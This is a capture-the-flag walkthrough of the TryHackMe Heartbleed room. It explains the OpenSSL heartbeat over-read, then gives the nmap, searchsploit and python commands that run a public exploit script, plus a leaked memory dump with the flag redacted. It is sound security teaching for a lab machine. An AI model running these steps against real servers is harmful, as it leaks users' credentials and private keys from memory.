# THM: HeartBleed

| Stat       | Value                                        |
| ---------- | -------------------------------------------- |
| Room       | HeartBleed                                   |
| URL        | https://tryhackme.com/room/heartbleed        |
| Difficulty | Easy                                         |

## Concepts/Tools Used

- Python
- SearchSploit

## Description

SSL issues are still lurking in the wild! Can you exploit this web servers OpenSSL?

## Process

This room has 2 parts. The first is information about the HeartBleed bug and what is causing it. The room provides a high level summary of how the bug can exploit memory on the server. There are a few external links that give more information and explain how this is a massive vulnerablity. The 2nd task wants you to exploit HeartBleed on a server to get the flag.

## Task 1 Background Information

I spent a lot of time reading the material and trying to understand the bug. I had to look up more information and I thought I would just provide some additional insights into what is needed to exploit this vulnerability.

It is obvious that this exploit needs SSL or TLS. Since TLS is the successor of SSL and SSLv3 is totally broken I will just talk about using TLS for an https connection in this room.

In order to perform the heartbeat request (the request that causes the HeartBleed attack), you need to have a connection with the server. Below are the minimum requests and responses for a HeartBleed attack.

| Step | Description | Who sends it |
| ---- | ----------- | ------------ |
| 1. | **ClientHello** handshake connection request | **Attacker -> Server** |
| 2. | **ServerHello** (plus cert, etc.) handshake connection response | **Server -> Attacker** |
| 3. | **(TLS Handshake completes)** - now both sides can send encrypted data |  |
| 4. | **Heartbeat** request with **fake large payload length** | **Attacker -> Server** |
| 5. | **Heartbeat** response leaking memory past intended payload | **Server -> Attacker** |

Steps 4 and 5 are at the heart (no pun intended) of this room.

### How the request and response should work

It turns out that a heartbeat request is very simple. The 2 properties that matter are the content and the length of the content. So I send a heartbeat request with these 2 properties to a server:

Content: 'Hello'
Content-Length: 5

The server is suppose to look at the Content-Length property and create a buffer of that length in memory. Then it copies the text in the Content property into that buffer that it just created. Then it copys that buffer into a response and sends the response back to me so that our TLS connection stays alive.

### How HeartBleed works

This vulnerability exists because it trusted user input. In my example above I said that my Content-Length was 5 bytes. But what if I had the same Content and I said that my Content-Length was 65,535 bytes?

This is where the vulnerability. It doesn't check the length of my Content it just blindly trusts that I am sending the correct Content-Length for my Content.

In this case, the server will allocate a 65,535 byte buffer in memory. Keep in mind that deallocated memory still has the values that were in those addresses when the memory was allocated. Then it will copy over the 5 bytes in my Content property. Then it will read all the bytes from the buffer (all 65,535 of them) and copy them to the response that goes back to me.

So now I have all kinds of things that were in memory when I made my request. It turns out that this can be usernames, passwords, sensitive chat logs and emails, environment variables, secret keys for X.509 certificates, critical business documents and more.

## Task 2 Protecting Data In Transit

I added the ip address of the machine to my host file with the alias of target.thm. So the command was:

`echo "10.10.121.123   target.thm" >> /etc/hosts`

I then ran my usual starting nmap command on this machine:

`nmap -p- -Pn -T5 -v target.thm`

Port 443 is up. I didn't bother with the other ports. I knew I needed to exploit the https connection on the box.

I used searchsploit to see if it had a script ready to go. I ran the following:

`searchsploit heartbleed`

It had a few scripts, they were a bit out of date. I expected it since HeartBleed is now a decade old at the time of this writing.

I copied over the first one that was provided by searchsploit to my current directory witht the following command:

`searchsploit 32764 -m`

The `-m` option moves the script to my current directory. 32764 is the exploit id in searchsploit.

I had to comment out 1 line to get this to work. Line 32 is the issue, I changed it from this:

`version.append(['SSL 3.0','03 00'])`

To this:

`#version.append(['SSL 3.0','03 00'])`

Again, SSLv3 is broken and so most servers do not support it. Commenting it out allows the script to try the 3 TLS methods.

I now run the script with python2 (the print calls don't have brackets and that only works with python2). Here is how I run it:

`python 32764.py target.thm -p 443 > output.txt`

Looking through the output.txt file, I see the flag on the right hand side as I scroll down. Here is the output with the key redacted:

```bash
  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 6E 67 74 68  ....#.......ngth
  00e0: 3A 20 37 35 0D 0A 43 6F 6E 74 65 6E 74 2D 54 79  : 75..Content-Ty
  00f0: 70 65 3A 20 61 70 70 6C 69 63 61 74 69 6F 6E 2F  pe: application/
  0100: 78 2D 77 77 77 2D 66 6F 72 6D 2D 75 72 6C 65 6E  x-www-form-urlen
  0110: 63 6F 64 65 64 0D 0A 0D 0A 75 73 65 72 5F 6E 61  coded....user_na
  0120: 6D 65 3D 68 61 63 6B 65 72 31 30 31 26 75 73 65  me=hacker101&use
  0130: 72 5F 65 6D 61 69 6C 3D 68 61 78 6F 72 40 68 61  r_email=haxor@ha
  0140: 78 6F 72 2E 63 6F 6D 26 75 73 65 72 5F 6D 65 73  xor.com&user_mes
  0150: 73 61 67 65 3D 54 48 4D 7B 00 00 00 00 00 00 00  sage=THM{#######
  0160: 00 00 00 7D AF 7B 00 28 AF 84 87 27 59 A9 CF EB  ###}.{.(...'Y...
  0170: 74 86 D3 07 00 00 00 00 00 00 00 00 00 00 00 00  t...............
  0180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
  0190: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
'''
